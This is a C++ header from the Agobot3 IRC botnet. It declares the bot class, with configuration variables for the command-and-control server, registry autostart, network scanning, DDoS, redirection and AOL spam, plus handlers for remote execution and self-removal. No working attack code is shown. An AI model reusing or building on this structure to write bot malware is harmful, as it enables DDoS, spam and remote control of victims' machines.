/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __BOT_H__
#define __BOT_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CBot : public CCommandHandler
{
public:
	CBot();
	void Init();
	void Config();
	void Recv(CMessage *pMsg);
	bool HandleMsg(CMessage *pMsg);
	bool Think();

	CString SysInfo();
	CString LongUptime(int iDays);
	CString Status();

	bool m_bJoined;
	unsigned long m_lStartTime;

	cvar	si_nickprefix, si_servpass, si_server, si_port, si_chanpass, si_mainchan, si_nick, si_usessl, \
			bot_version, bot_filename, bot_id, bot_prefix, bot_ftrans_port, bot_timeout, bot_seclogin, \
			bot_compnick, \
			as_valname, as_enabled, \
			scan_maxthreads, scan_auto, scan_auto_nb, \
			ddos_maxthreads, \
			redir_maxthreads, \
			spam_aol_channel, spam_aol_enabled, \
			identd_enabled;

	bool HandleCommand(CMessage *pMsg);

	command	m_cmdRemove, m_cmdStatus, m_cmdRndNick, m_cmdDie, m_cmdId, m_cmdAbout, \
			m_cmdSysInfo, m_cmdLongUptime, m_cmdNick, m_cmdOpen, m_cmdDns, m_cmdRemoveAllBut, \
			m_cmdExecute, m_cmdQuit, m_cmdFlushDNS, m_cmdSecure;
	
	irc_server	m_isServerRoot, m_isServer0, m_isServer1, m_isServer2, m_isServer3;
};

#endif // __BOT_H__
